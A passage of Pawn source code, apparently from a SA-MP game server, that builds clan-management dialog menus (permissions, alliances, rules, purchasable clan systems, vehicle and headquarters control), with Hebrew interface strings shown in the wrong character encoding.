		}
		case clan_manage:
		{
			_head = "Ёщфхь фўьря", _style = DIALOG_STYLE_LIST, _b1 = "счщ°ф", _b2 = "чцх°", _parent = clan_main;
			format(string,sizeof(string),@c(grey) "фўьря Ї·хч ьшёшщэ: " @c(white) "%s",claninfo[playerinfo[playerid][clan]][ctest] ? ("ыя") : ("ьр"));
			sadd(_text,string);
			format(string,sizeof(string),"{%s}∙щЁхщ ЎсЄ фўьря: " @c(white) "%d %d %d",HexStringOfColor(rgba2hex(claninfo[playerinfo[playerid][clan]][ccolor][0],claninfo[playerinfo[playerid][clan]][ccolor][1],claninfo[playerinfo[playerid][clan]][ccolor][2],255)),claninfo[playerinfo[playerid][clan]][ccolor][0],claninfo[playerinfo[playerid][clan]][ccolor][1],claninfo[playerinfo[playerid][clan]][ccolor][2]);
			sadd(_text,string);
			sadd(_text,@c(grey) "Ёщфхь фхуЄ· фўьря");
			sadd(_text,@c(grey) "Ёщфхь чхўщ фўьря");
			sadd(_text,@c(grey) "Ёщфхь рх·х·");
			sadd(_text,@c(grey) "Ёщфхь ф°∙рх·");
		}
		case clan_systems:
		{
			_head = "юЄ°ых·", _style = DIALOG_STYLE_LIST, _b1 = "счщ°ф", _b2 = "чцх°", _parent = clan_main;
			sadd(_text,@c(yellow) "(+) °ыщ∙· юЄ°ы· чу∙ф");
			sadd(_text,@c(blue) "(?) ющуЄ Єь юЄ°ых· фўьря");
			for(new i = 0; i < sizeof(ClanSystems); i++)
			{
				if(claninfo[playerinfo[playerid][clan]][csystems][i])
				{
					switch(i)
					{
						case clansys_tk: format(string,sizeof(string),claninfo[playerinfo[playerid][clan]][csystemparam][i] ? ("ЇЄщь") : ("ысхщ"));
						case clansys_alert: format(string,sizeof(string),"рцЄўф %s, °юф %d/3",claninfo[playerinfo[playerid][clan]][csystemparam][i] ? ("ЇЄщьф") : ("ысхщф"),claninfo[playerinfo[playerid][clan]][calert][0]);
						case clansys_lockveh: format(string,sizeof(string),claninfo[playerinfo[playerid][clan]][csystemparam][i] ? ("ЇЄщь") : ("ысхщ"));
						case clansys_lockpick: format(string,sizeof(string),claninfo[playerinfo[playerid][clan]][csystemparam][i] ? ("ЇЄщь") : ("ысхщ"));
						case clansys_controlv, clansys_controlhq: format(string,sizeof(string),"ьчї ьрЇ∙°хщх·");
						case clansys_security: format(string,sizeof(string),claninfo[playerinfo[playerid][clan]][csystemparam][i] ? ("ЇЄщь") : ("ысхщ"));
					}
					format(string,sizeof(string),@h(00FF00) "%s: " @c(white) "%s",ClanSystems[i][clsName],string);
				}
				else format(string,sizeof(string),@h(FF0000) "%s: " @c(white) "фюЄ°ы· ьр Ё°ы∙ф",ClanSystems[i][clsName],string);
				sadd(_text, string);
			}
		}
		case clan_chat:
		{
			_head = "Ёщфхь фЎ'рш", _style = DIALOG_STYLE_LIST, _b1 = "Є°щыф", _b2 = "чцх°", _parent = clan_main;
			format(string,sizeof(string),@c(grey) "юЎс Ў'рш фўьря: " @c(white) "%s",claninfo[playerinfo[playerid][clan]][cchatlock] ? ("ЁЄхь") : ("Ї·хч"));
			sadd(_text,string);
			format(string,sizeof(string),"{%s}∙щЁхщ ЎсЄ фы·щсф сЎ'рш: " @c(white) "%d %d %d",HexStringOfColor(claninfo[playerinfo[playerid][clan]][cchatcolor][0]),getRed(claninfo[playerinfo[playerid][clan]][cchatcolor][0]),getGreen(claninfo[playerinfo[playerid][clan]][cchatcolor][0]),getBlue(claninfo[playerinfo[playerid][clan]][cchatcolor][0]));
			sadd(_text,string);
			format(string,sizeof(string),"{%s}∙щЁхщ ЎсЄ фы·щсф сЎ'рш ььщу°щэ: " @c(white) "%d %d %d",HexStringOfColor(claninfo[playerinfo[playerid][clan]][cchatcolor][1]),getRed(claninfo[playerinfo[playerid][clan]][cchatcolor][1]),getGreen(claninfo[playerinfo[playerid][clan]][cchatcolor][1]),getBlue(claninfo[playerinfo[playerid][clan]][cchatcolor][1]));
			sadd(_text,string);
			sadd(_text,@c(grey) "рщЇхё ЎсЄщ фы·щсф сЎ'рш");
			format(string,sizeof(string),@c(grey) "∙щ·хє фЎ'рш Єэ ўьрЁщэ сс°щ·: " @c(white) "%s",claninfo[playerinfo[playerid][clan]][cchatpeace] ? ("ЇЄщь") : ("ысхщ"));
			sadd(_text,string);
		}
		case clan_powers:
		{
			_head = "ыхчх· ющхчущэ", _style = DIALOG_STYLE_LIST, _b1 = "счщ°ф", _b2 = "чцх°", _parent = clan_main;
			sadd(_text,@c(blue) "(?) ющуЄ Єь ыь фыхчх·");
			for(new i = 0; i < sizeof(cupowers); i++)
			{
				format(string,sizeof(string),"{%s}%d) %s%s",HexStringOfColor(!(i % 2) ? white : lightyellow),i+1,cupowers[i][CUPName],claninfo[playerinfo[playerid][clan]][cpowers][i] ? ("") : (@c(red)" - ыхч ьр Ё°ы∙"));
				sadd(_text,string);
			}
		}
		case clan_cameras:
		{
			_head = "юЎьюх· рсшчф", _style = DIALOG_STYLE_LIST, _b1 = "счщ°ф", _b2 = "чцх°", _parent = clan_main;
			sadd(_text,@c(blue) "(?) ющуЄ Єь юЎьюх· фрсшчф");
			for(new i = 0; i < MAX_CLAN_CAMERAS; i++) if(ccameras[playerinfo[playerid][clan]][i][camLevel] > 0)
			{
				format(string,sizeof(string),"{%s}юЎьюф юёЇ° #%d%s",HexStringOfColor(!(i % 2) ? white : lightyellow),i+1,ccameras[playerinfo[playerid][clan]][i][camLevel] >= 2 ? (" - HD") : (""));
				sadd(_text,string);
			}
		}
		case clan_store:
		{
			_head = "ўЁщх·", _style = DIALOG_STYLE_LIST, _b1 = "счщ°ф", _b2 = "чцх°", _parent = clan_main;
			sadd(_text,@c(blue) "(?) ющуЄ Єь фўЁщх·");
		}
		case clan_alliances:
		{
			_head = "с°щ·х·", _style = DIALOG_STYLE_LIST, _b1 = "счщ°ф", _b2 = "чцх°", _parent = clan_main;
			sadd(_text,@c(yellow) "(+) фхёЇ· с°щ· чу∙ф");
			sadd(_text,@c(blue) "(-) фё°· с°щ· ўщщю·");
			sadd(_text,@c(grey) "рщ∙х° с°щ·");
			sadd(_text,@c(grey) "ёщ°хс ьс°щ·");
			sadd(_text,@c(red) ":ўьрЁщэ сс°щ·");
			for(new i = 1; i <= MAXCLANS; i++) if(claninfo[i][cvalid] && i != playerinfo[playerid][clan] && claninfo[i][cpeace][playerinfo[playerid][clan]])
			{
				format(string,sizeof(string),"{%s}%s",ClanHexColor(i),claninfo[i][cname]);
				sadd(_text,string);
			}
		}
		case clan_alliances_invite:
		{
			_head = "фцюЁф ьс°щ·", _style = DIALOG_STYLE_INPUT, _b1 = "фцюя", _b2 = "чцх°", _parent = clan_alliances;
			sadd(_text,@c(grey) " .рЁр фця р· ∙э фўьря ∙с°ЎхЁъ ьфцющя рх·х ьс°щ·");
		}
		case clan_alliances_remove:
		{
			_head = "фё°· с°щ·", _style = DIALOG_STYLE_INPUT, _b1 = "фё°", _b2 = "чцх°", _parent = clan_alliances;
			sadd(_text,@c(grey) " .рЁр фця р· ∙э фўьря ∙с°ЎхЁъ ьсшь рщ·х р· фёыэ фс°щ·");
		}
		case clan_other:
		{
			_head = "ўьрЁщэ рч°щэ", _style = DIALOG_STYLE_LIST, _b1 = "счщ°ф", _b2 = "чцх°", _parent = clan_main;
			sadd(_text,@c(grey) "°∙щю· ыь фўьрЁщэ");
			sadd(_text,@c(grey) "°∙щю· ыь фюЇўух·");
			//sadd(_text,@c(grey) "юьчюх· ўьрЁщэ");
			sadd(_text,@c(red) "/creport :ущххч Єь ўьря");
		}
		case clan_quit:
		{
			_head = "Ї°щ∙ф юфўьря", _style = DIALOG_STYLE_MSGBOX, _b1 = "Ї°щ∙ф", _b2 = "чцх°", _parent = clan_main;
			sadd(_text,@c(red) "?фрэ р·ф сшхч ∙р·ф юЄхЁщщя ьЇ°х∙ юфўьря");
			sadd(_text,".ьр ·хыь ьчцх° рьщх рьр рэ щцющЁх рх·ъ ∙хс");
			/*format(string,sizeof(string),"(?ю·ыххя ьЇ°х∙ юфўьря %s)",string,GetName(playerid));
			for(new i = 0; i < claninfo[playerinfo[playerid][clan]][cmembers]; i++) if(claninfo[playerinfo[playerid][clan]][cplayers][i] != playerid) SendClientMessage(claninfo[playerinfo[playerid][clan]][cplayers][i],grey,string);*/
		}
		/*case clan_tutorial:
		{
			_head = "юу°щъ", _style = DIALOG_STYLE_MSGBOX, _b1 = "ыЁщёф", _b2 = "чцх°", _parent = clan_main;
			sadd(_text,@c(yellow) ".ьчї \"ыЁщёф\" ыущ ьф·чщь р· фюу°щъ");
		}*/
		case clan_viewmember:
		{
			_head = "ЎЇщщф счс° фўьря", _style = DIALOG_STYLE_MSGBOX, _b1 = "Ёщфхь", _b2 = "чцх°", _parent = playerinfo[playerid][cclick][2] = (paramint == 0 ? playerinfo[playerid][cclick][0] : paramint);
			format(string,sizeof(string),@c(lightblue) "╗ :%s ЎЇщщф счс° фўьря\n",param);
			sadd(_text,string);
			playerinfo[playerid][clickon] = ClanPList_Index(playerinfo[playerid][clan],param);
			new pid = GetExactID(param);
			if(IsPlayerConnected(pid))
			{
				format(string,sizeof(string),@c(grey) "ID: " @c(white) "%d",pid);
				sadd(_text,string);
				format(string,sizeof(string),@c(grey) "Clan Level: " @c(white) "%d",playerinfo[pid][lclan]);
				sadd(_text,string);
				if(strlen(playerinfo[pid][clantag]) > 0)
				{
					format(string,sizeof(string),@c(grey) "Tag: " @c(white) "%s",playerinfo[pid][clantag]);
					sadd(_text,string);
				}
			}
			else
			{
				format(f,sizeof(f),"/DM/Users/%s.ini",param);
				sadd(_text,@c(grey) "ID: " @c(white) "ьр ючхс° ь∙°·");
				format(string,sizeof(string),@c(grey) "Clan Level: " @c(white) "%d",fgetint(f,"ClanLevel"));
				sadd(_text,string);
				format(string,sizeof(string),fgetstring(f,"ClanTag"));
				if(strlen(string) > 1)
				{
					format(string,sizeof(string),@c(grey) "Tag: " @c(white) "%s",string);
					sadd(_text,string);
				}
			}
		}
		case clan_optmember:
		{
			format(_head,sizeof(_head),"%s :рЇ∙°хщх·",ClanPList_Player(playerinfo[playerid][clan],playerinfo[playerid][clickon]));
			_style = DIALOG_STYLE_LIST, _b1 = "сщЎхЄ", _b2 = "чцх°", _parent = playerinfo[playerid][cclick][2], paramint = playerinfo[playerid][clickon];
			sadd(_text,@c(grey) "∙щЁхщ ·рт");
			sadd(_text,@c(grey) "фё° ·рт");
			sadd(_text,@c(grey) "∙щЁхщ °ю· тщ∙х·");
			sadd(_text,@c(red) "фхЎрф юфўьря");
		}
		case clan_settag:
		{
			format(_head,sizeof(_head),"%s :∙щЁхщ ·рт",ClanPList_Player(playerinfo[playerid][clan],playerinfo[playerid][clickon]));
			_style = DIALOG_STYLE_INPUT, _b1 = "∙Ёф", _b2 = "чцх°", _parent = clan_viewmember, paramint = playerinfo[playerid][clickon];
			sadd(_text,@c(grey) ":Ёр ьфўьщу ·рт Єу 12 ·хщэ");
		}
		case clan_setlevel:
		{
			format(_head,sizeof(_head),"%s :∙щЁхщ °ю· тщ∙х·",ClanPList_Player(playerinfo[playerid][clan],playerinfo[playerid][clickon]));
			_style = DIALOG_STYLE_INPUT, _b1 = "∙Ёф", _b2 = "чцх°", _parent = clan_viewmember, paramint = playerinfo[playerid][clickon];
			sadd(_text,@c(darkred) "* !∙щэ ьс: °ю· тщ∙х· фщр ф°юф ь∙щюх∙ срЇ∙°хщх· ∙хЁх· ∙ь фўьря");
			sadd(_text,@c(darkred) "* !Ёр ьфхёщє рх·ф °ў ьющ ∙р·ф ёхюъ Єьщх");
			sadd(_text,@c(darkred) "(ьющуЄ юьр Єь ф°∙рх· х°ю· тщ∙х·, фыЁё ь·Ї°щш Ёщфхь фўьря -> Ёщфхь ф°∙рх· -> ющуЄ)");
			sadd(_text,@c(grey) ":Ёр ьфўьщу °ю· тщ∙х· ю1 Єу 5");
		}
		case clan_kick:
		{
			format(_head,sizeof(_head),"%s :фхЎрф юфўьря",ClanPList_Player(playerinfo[playerid][clan],playerinfo[playerid][clickon]));
			_style = DIALOG_STYLE_MSGBOX, _b1 = "фхЎр", _b2 = "чцх°", _parent = clan_viewmember, paramint = playerinfo[playerid][clickon];
			sadd(_text,"?фрэ р·ф сшхч ∙р·ф юЄхЁщщя ьфхЎщр р· фю∙·ю∙ фцф юфўьря");
		}
		case clan_addmember:
		{
			_head = "фхёЇ· ∙чўя чу∙", _style = DIALOG_STYLE_INPUT, _b1 = "фхёЇф", _b2 = "чцх°", _parent = clan_allmembers;
			if(strlen(param) > 0)
			{
				format(string,sizeof(string),param);
				sadd(_text,string);
			}
			sadd(_text,@c(grey) ":фюухщщў ∙ьх ID-Ёр ьфўьщу р· ∙э ф∙чўя фюьр, рх р· фф·чьф ∙ь ∙юх, рх р· ф");
		}
		case clan_selectpos:
		{
			format(_head,sizeof(_head),"счщ°· ющўхэ: %s",param);
			_style = DIALOG_STYLE_LIST, _b1 = "счщ°ф", _b2 = "чцх°", _parent = paramint == 0 ? playerinfo[playerid][cclick][0] : paramint;
			playerinfo[playerid][selectingpos][0] = -1;
			sadd(_text,@c(lightred) "∙ющ°ф сющўхэ фЁхычщ ∙ьъ");
			sadd(_text,@c(yellow) "счщ°· ющўхэ у°ъ фю∙чў");
			sadd(_text,@c(lightgreen) "счщ°· ющўхэ у°ъ фюЇф");
		}
		case clan_editcmd:
		{
			_head = "Є°щы· Їўхуф", _style = DIALOG_STYLE_INPUT, _b1 = "Є°щыф", _b2 = "чцх°", _parent = clan_edit;
			sadd(_text,@c(grey) ":Ёр ьфўьщу ыря ььр / р· фЇўхуф ∙·∙ю∙ ыЇўху· ∙щтх° ьюЇўу· фўьря");
		}
		case clan_editgangzone:
		{
			_head = "Є°щы· рцх° фўьря", _style = DIALOG_STYLE_LIST, _b1 = "счщ°ф", _b2 = "чцх°", _parent = clan_edit;
			sadd(_text,"тхуь рцх° 1");
			sadd(_text,"тхуь рцх° 2");
			sadd(_text,"тхуь рцх° 3");
			sadd(_text,"тхуь рцх° 4");
			sadd(_text,"тхуь рцх° 5");
		}
		case clan_editcolor: _head = "∙щЁхщ ЎсЄ фўьря", _style = DIALOG_STYLE_INPUT, _b1 = "∙щЁхщ", _b2 = "чцх°", _parent = clan_manage, colorChoosing = true;
		case clan_message:
		{
			_head = "фхуЄ· фўьря", _style = DIALOG_STYLE_LIST, _b1 = "счщ°ф", _b2 = "чцх°", _parent = clan_manage;
			sadd(_text,@c(blue) "(?) ющуЄ Єь фхуЄ· фўьря");
			sadd(_text,@c(grey) "ЎЇф сфхуЄ· фўьря");
			sadd(_text,@c(grey) "Є°щы· фхуЄ· фўьря");
			sadd(_text,@c(grey) "ючщў· фхуЄ· фўьря");
			sadd(_text,@c(grey) "фЎт· ффхуЄф ьўьря");
		}
		case clan_messageedit:
		{
			_head = "Є°щы· фхуЄ· фўьря", _style = DIALOG_STYLE_INPUT, _b1 = "Є°щыф", _b2 = "чцх°", _parent = clan_message;
			sadd(_text,@c(grey) ":Ёр ьфўьщу ыря р· фхуЄ· фўьря фчу∙ф");
		}
		case clan_rules:
		{
			_head = "чхўщ фўьря", _style = DIALOG_STYLE_LIST, _b1 = "счщ°ф", _b2 = "чцх°", _parent = clan_manage;
			sadd(_text,@c(blue) "(?) ющуЄ Єь чхўщ фўьря");
			sadd(_text,@c(grey) "ЎЇф счхўщ фўьря");
			sadd(_text,@c(grey) "Є°щы· °∙щю· фчхўщэ");
			sadd(_text,@c(grey) "ючщў· ыь чхўщ фўьря");
			sadd(_text,@c(grey) "фЎт· фчхўщэ ьчс°щ фўьря");
		}
		case clan_rulesedit:
		{
			_head = "Є°щы· чхўщ фўьря", _style = DIALOG_STYLE_LIST, _b1 = "Є°щыф", _b2 = "чцх°", _parent = clan_rules;
			for(new i = 0; i < sizeof(crules[]); i++)
			{
				if(strlen(crules[playerinfo[playerid][clan]][i]) <= 1) format(string,sizeof(string),"%02d. " @c(grey) "- ьр фхту° чхў -",i+1);
				else format(string,sizeof(string),"%02d. " @c(white) "%s",i+1,crules[playerinfo[playerid][clan]][i]);
				sadd(_text,string);
			}
		}
		case clan_rulesreset:
		{
			_head = "рщЇхё чхўщ фўьря", _style = DIALOG_STYLE_MSGBOX, _b1 = "рщЇхё", _b2 = "чцх°", _parent = clan_rules;
			sadd(_text,@c(red) ".фрэ р·ф сшхч ∙с°ЎхЁъ ьючхў р· ыь фчхўщэ? ьр щфщф Ёщ·я ь∙чц° рх·э ьрч° юыя");
		}
		case clan_ruleinput:
		{
			format(_head,sizeof(_head),"Є°щы· чхў %02d",paramint+1);
			_style = DIALOG_STYLE_INPUT, _b1 = "ёщхэ", _b2 = "чцх°", _parent = clan_rulesedit;
			format(string,sizeof(string),@c(white) "\"%s\"",param);
			sadd(_text,string);
			sadd(_text,@c(grey) ":Ёр ьфўьщу р· фшўёш ∙р·ф юЄхЁщщя ь°∙хэ ьчхў цф");
			sadd(_text,"(фўьу ·х рчу сьсу рх Їчх· Єь юЁ· ьфёщ° р· фчхў фцф)");
		}
		case clan_signs:
		{
			_head = "рх·х· фўьря", _style = DIALOG_STYLE_LIST, _b1 = "счщ°ф", _b2 = "чцх°", _parent = clan_manage;
			sadd(_text,@c(blue) "(?) ющуЄ Єь рх·х· фўьря");
			for(new i = 0; i < 3; i++)
			{
				format(string,sizeof(string),"{%s}(/%d) ",HexStringOfColor(!(i % 2) ? white : lightyellow),i+1);
				if(strlen(csigns[playerinfo[playerid][clan]][i]) <= 1) format(string,sizeof(string),"%s" @c(grey) "- ьр фхту°ф рх· -",string);
				else format(string,sizeof(string),"%s" @c(white) "%s",string,csigns[playerinfo[playerid][clan]][i]);
				sadd(_text,string);
			}
		}
		case clan_signinput:
		{
			format(_head,sizeof(_head),"Є°щы· рх· %d",paramint);
			_style = DIALOG_STYLE_INPUT, _b1 = "Є°щыф", _b2 = "чцх°", _parent = clan_manage;
			format(string,sizeof(string),@c(white) "\"%s\"",param);
			sadd(_text,string);
			sadd(_text,@c(grey) ":фўьу ыря р· фшўёш фчу∙ ∙щ∙хю∙ срх·");
			sadd(_text,"(фўьу ·х рчу сьсу рх Їчх· Єь юЁ· ьфёщ° р· фрх· фцх)");
		}
		case clan_perms:
		{
			_head = "ф°∙рх·", _style = DIALOG_STYLE_LIST, _b1 = "счщ°ф", _b2 = "чцх°", _parent = clan_manage;
			sadd(_text,@c(blue) "(?) ющуЄ Єь фф°∙рх·");
			sadd(_text,@c(grey) "ЎЇф сыь фф°∙рх·");
			sadd(_text,@c(grey) "Є°щы· ф°∙рх·");
			sadd(_text,@c(grey) "фчц°· ф°∙рх· ьс°щ°· ючуь");
		}
		case clan_permsview_total:
		{
		    _head = "ЎЇщщф сф°∙рх· фўьря", _style = DIALOG_STYLE_MSGBOX, _b1 = "ётх°", _b2 = "чцх°", _parent = clan_perms;
			new str[M_S];
			sadd(_text, @c(orange));
            for(new x, j = sizeof(ClanPermissions); x < j; x++)
            {
				format(str, sizeof(str), " Х %d) %s - %d", x + 1, ClanPermissions[x][clpName], claninfo[playerinfo[playerid][clan]][cperms][x]);
				sadd(_text, str);
			}
		}
		case clan_permsview:
		{
			_head = "ф°∙рх· ьЇщ °юф", _style = DIALOG_STYLE_LIST, _b1 = "ЎЇщщф", _b2 = "чцх°", _parent = clan_perms;
			for(new i = 1; i <= 5; i++)
			{
				format(string,sizeof(string),"{%s}ЎЇщщф сф°∙рх· ∙ь °ю· тщ∙х· %d",HexStringOfColor(!((i-1) % 2) ? white : lightyellow),i);
				sadd(_text,string);
			}
		}
		case clan_permsedit:
		{
			_head = "Є°щы· ф°∙рх·", _style = DIALOG_STYLE_LIST, _b1 = "∙щЁхщ", _b2 = "чцх°", _parent = clan_perms;
			for(new i = 0; i < sizeof(ClanPermissions); i++)
			{
				format(string,sizeof(string),@c(orange) "Х [%d] %s",claninfo[playerinfo[playerid][clan]][cperms][i],ClanPermissions[i][clpName]);
				sadd(_text,string);
			}
		}
		case clan_permselect:
		{
			format(_head,sizeof(_head),ClanPermissions[paramint][clpName]);
			_style = DIALOG_STYLE_LIST, _b1 = "∙щЁхщ", _b2 = "чцх°", _parent = clan_perms;
			for(new i = 1; i <= 5; i++)
			{
				format(string,sizeof(string),"°ю· тщ∙х· %d",i);
				if(i == claninfo[playerinfo[playerid][clan]][cperms][paramint]) strcat(string, @c(grey)" -- °юф Ёхычщ·");
				sadd(_text,string);
   			}
			format(string,sizeof(string),@c(red)"%d :°юф юхюьЎ·",ClanPermissions[paramint][clpDefault]);
			sadd(_text,string);
		}
		case clan_permsdefaults:
		{
			_head = "фчц°· ф°∙рх· ьс°щ°· ючуь", _style = DIALOG_STYLE_MSGBOX, _b1 = "ыя", _b2 = "ьр", _parent = clan_perms;
			sadd(_text,".рхЇЎщщф цх ·рЇ∙° ьъ ьфчцщ° р· ыь фф°∙рх· ь°юх· фтщ∙х· фюхюьЎх· ьфя");
			sadd(_text,@c(red) ".фрэ р·ф сшхч ∙р·ф °хЎф ьфчцщ° р· фф°∙рх· ьс°щ°· ючуь? ыь ∙щЁхщ ∙Є∙щ· сфя щхчьє");
		}
		case clan_buysystems:
		{
			_head = "ўЁщщ· юЄ°ых·", _style = DIALOG_STYLE_LIST, _b1 = "ўЁщщф", _b2 = "чцх°", _parent = clan_systems;
			for(new i = 0; i < sizeof(ClanSystems); i++)
			{
				format(string,sizeof(string),@c(darkblue) "Х %s - $%d%s",ClanSystems[i][clsName],ClanSystems[i][clsCost],claninfo[playerinfo[playerid][clan]][csystems][i] ? (" (Ё°ы∙ф)") : (""));
				sadd(_text,string);
			}
		}
		case clan_buysystem:
		{
			new s = playerinfo[playerid][clickon];
			format(_head,sizeof(_head),ClanSystems[s][clsName]);
			_style = DIALOG_STYLE_MSGBOX, _b1 = claninfo[playerinfo[playerid][clan]][csystems][s] ? ("чцх°") : ("ўЁф"), _b2 = claninfo[playerinfo[playerid][clan]][csystems][s] ? ("") : ("чцх°"), _parent = clan_buysystems;
			if(claninfo[playerinfo[playerid][clan]][csystems][s]) _b1 = "чцх°", _b2 = "";
			else _b1 = "ўЁф", _b2 = "чцх°";
			sadd(_text,@c(lightred) ":∙э фюЄ°ы·");
			format(string,sizeof(string),@c(white) "%s",ClanSystems[s][clsName]);
			sadd(_text,string);
			sadd(_text,@c(lightred) ":ючщ°");
			format(string,sizeof(string),@c(white) "$%d",ClanSystems[s][clsCost]);
			sadd(_text,string);
			sadd(_text,@c(lightred) ":ющуЄ");
			switch(s)
			{
				case clansys_tk:
				{
					sadd(_text,@c(white) ".юЄ°ы· фрЁшщ шщэ ўщь юхЁЄ· ЇтщЄх· сщя чс°щ фўьря");
					sadd(_text,",юф°тЄ ∙юЄ°ы· цх ·хЇЄь, чс°щ фўьря ьр щхыьх ьщ°х· рчу Єь ф∙Ёщ");
					sadd(_text,".'ыъ ∙фюЄ°ы· Єхц°· сюЁщЄ· ЇтщЄф ЄЎющ· сюфьъ Їьщ∙х· хых");
					sadd(_text,"/teamkill Ёщ·я ьфЇЄщь хьысх· сюфщ°х· р· фюЄ°ы· ьрч° ∙ўхЁщэ рх·ф, Є\"щ ·Ї°щш фўьрЁщэ \"юЄ°ых·\" рх фЇўхуф");
				}
				case clansys_alert:
				{
					sadd(_text,@c(white) ".юЄ°ы· фрцЄўф юрЇ∙°· ф·°рх· с°тЄ ∙щ∙ Їьщ∙ф ьюЇўуф");
					sadd(_text,".ьюЄ°ы· щ∙ 3 °юх·: Ёщ·я ьўЁх· юЄ°ы· рцЄўф хь∙Ї° рх·ф Єху ЇЄющщэ ыущ ьфЄьх· рх·ф °юф");
					sadd(_text,".сыь °юф фрцЄўф ·фщф шхсф щх·° х·ўьхш ∙чўЁщэ сюухщщў щх·°");
					sadd(_text,"/alert on/off Ёщ·я ьфЇЄщь хьысх· сюфщ°х· р· фюЄ°ы· ьрч° ∙ўхЁщэ рх·ф, Є\"щ ·Ї°щш фўьрЁщэ \"юЄ°ых·\" рх фЇўхуф");
					sadd(_text,"/alert mute сЁхёє Ёщ·я ьф∙·щў рх·ф цюЁщ· тэ ыр∙° фщр ЇЄщьф Єь щущ фЇўхуф");
				}
				case clansys_lockveh:
				{
					sadd(_text,@c(white) ".фтЁф Єь ф°ысщэ фщр фу°ъ фю°ыцщ· ь∙юх° ∙ьр щщтЁсх °ысщэ юфюЇўуф");
					sadd(_text,".юЄ°ы· цх, рч· юфщЄщьх· сщх·° юыь фюЄ°ых·, ·тя Єь °ысщ фўьря ыыф ∙ющ ∙ьр чс° сўьря ьр щхыь ьф∙·ю∙ сх");
					sadd(_text,".\"Ёщ·я ьфЇЄщь хьысх· сюфщ°х· р· фюЄ°ы· ьрч° ∙ўхЁщэ рх·ф, Є\"щ ·Ї°щш фўьрЁщэ \"юЄ°ых·");
				}
				case clansys_lockpick:
				{
					sadd(_text,@c(white) ".юЄ°ы· цх ютЁф Єь фЇщўрЇщэ (чщщэ, ютя, Ё∙ўщэ) ∙ь фюЇўуф");
					sadd(_text,"!с°тЄ ∙∙чўя ∙рщЁх чс° ўьря щщўч р· рчу юфЇщўрЇщэ фхр щ·ЇхЎї сюўхэ");
				}
				case clansys_controlv:
				{
					sadd(_text,@c(white) ".юЄ°ы· цх юсщрф ьўьря ∙ьщшф юьрф Єь ф°ысщэ ∙сюЇўуф");
					sadd(_text,".Ёщ·я сўьх· ьфчцщ° р· ыхьэ ьёЇрхя, ь∙Ёх· ьыхьэ р· фЎсЄ (срхЇя ·ющущ рх цюЁщ) хЄху");
				}
				case clansys_controlhq:
				{
					sadd(_text,@c(white) ".юЄ°ы· цх юсщрф ьўьря ∙ьщшф юьрф Єь фрхсщщўшщэ ∙ь фюЇўуф");
					sadd(_text,".сЄц°·ф Ёщ·я ьщЎх° рЇўшщэ Ёчюущэ ьрхсщщўшщэ хь∙Ёх· ьфэ р· фЎсЄ срхЇя цюЁщ");
				}
				case clansys_security:
				{
					sadd(_text,@c(white) ".юЄ°ы· фрсшчф фщр юЄ°ы· ю°ыцщ· ∙юш°·ф ьфтя Єь фюЇўуф");
					sadd(_text,".фщр ·Ёрщ фы°чщ ьўЁщх· ∙ў∙х°х· ьрсшчф, ыюх юЎьюх· рсшчф, ∙щЇх° °ю· рцЄўф хЄху");
					sadd(_text,".сЁхёє фщр ·цфф Їхь∙щэ ьюЇўуф х··°щЄ сЎ'рш Єэ ∙юх·щфэ");
				}
			}
			sadd(_text,claninfo[playerinfo[playerid][clan]][csystems][s] ? ("\n\n.ьўьря ∙ьъ ыс° щ∙ р· фюЄ°ы· фцх, ьыя ьр Ёщ·я ьўЁх· рх·ф") : ("\n\n.\"ьўьря ∙ьъ рщя р· фюЄ°ы· фцх, ьыя ·хыь ьўЁх· рх·ф сьчщЎф Єь \"ўЁф"));
			if(!claninfo[playerinfo[playerid][clan]][csystems][s])
			{
				sadd(_text,@c(red) "\n.∙щэ ьс! ўЁф р· фюЄ°ы· °ў рэ р·ф срю· сшхч сцф. тэ рэ ·Ї°х∙ юфўьря рх ·°Ўф ьючхў р· фюЄ°ы· хьўсь фчц°, ьр Ёщ·я ьЄ∙х· р· цф");
				sadd(_text,".фюЄ°ы· ·∙р° ∙щщы· ьўьря срхЇя ·ющущ Єу ∙фхр щщючў хьр Ёщ·я ьфхЎщр рх·ф ююЁх");
			}
		}
		case clan_vcontrol:
		{
			_head = "∙ьщшф с°ысщэ", _style = DIALOG_STYLE_LIST, _b1 = "счщ°ф", _b2 = "чцх°", _parent = clan_systems;
			sadd(_text,@c(grey) "°щёш ь°ысщэ");
			sadd(_text,@c(grey) "∙щЁхщ ЎсЄщэ");
			sadd(_text,@c(grey) "∙ющ°· ЎсЄщэ");
		}
		case clan_vcolor:
		{
			_head = "∙щЁхщ ЎсЄ ь°ысщэ", _style = DIALOG_STYLE_INPUT, _b1 = "∙щЁхщ", _b2 = "чцх°", _parent = clan_vcontrol;
			if(paramint == 1) sadd(_text,@c(yellow) ".фЎсЄщэ ф∙·Ёх! сч° с\"чцх°\" ыущ ьЎр· ю·Ї°щш цф\n\n");
			sadd(_text,@c(grey) ".сч° ∙Ёщ ЎсЄщэ ь°ысщэ, ьЇщ юёЇ° ЎсЄ (0 Єу 126) хфўьу р· ∙Ёщфэ цф ьщу цф юхЇ°ущэ с°ххч");
			sadd(_text,".ухтюф: 126 1 щрЇ∙°х ЎсЄ х°ху ься");
			sadd(_text,".фўьу ющЁхё 1 ьЎсЄ с°щ°· фючуь ∙ь ф°ыс");
		}
		case clan_savevcolors:
		{
			_head = "∙ющ°· ЎсЄщ °ысщэ", _style = DIALOG_STYLE_MSGBOX, _b1 = "∙юх°", _b2 = "чцх°", _parent = clan_vcontrol;
			sadd(_text,@c(grey) "?фрэ р·ф юЄхЁщщя ь∙юх° р· фЎсЄщэ фЁхычщщэ ∙ь °ысщ фюЇўуф");
			sadd(_text,@c(red) "/vcolor ∙щэ ьс ыщ фЎсЄщэ ∙щ∙ю°х щфщх рьх ∙∙щЁщ· у°ъ ·Ї°щш ∙ьщшф с°ысщэ рх сЇўхуф");
			sadd(_text,@c(red) ".ьр щфщф Ёщ·я ьфчцщ° рх·э ьЎсЄщэ фўхующэ, хф∙щЁхщ фцф фхр ∙щЁхщ ёхЇщ");
		}
		case clan_hqcontrol:
		{
			_head = "∙ьщшф сюЇўуф", _style = DIALOG_STYLE_LIST, _b1 = "счщ°ф", _b2 = "чцх°", _parent = clan_systems;
			//sadd(_text,@c(grey) "рЇўш рхсщщўшщэ");
			sadd(_text,@c(grey) "ўсщЄ· юфщ°хщх· ·цхцф");
			sadd(_text,@c(grey) "∙щЁхщ ю°ўэ рхсщщўшщэ");
			sadd(_text,@c(grey) "рщЇхё ю°ўэ рхсщщўшщэ");
		}
		case clan_effects:
		{
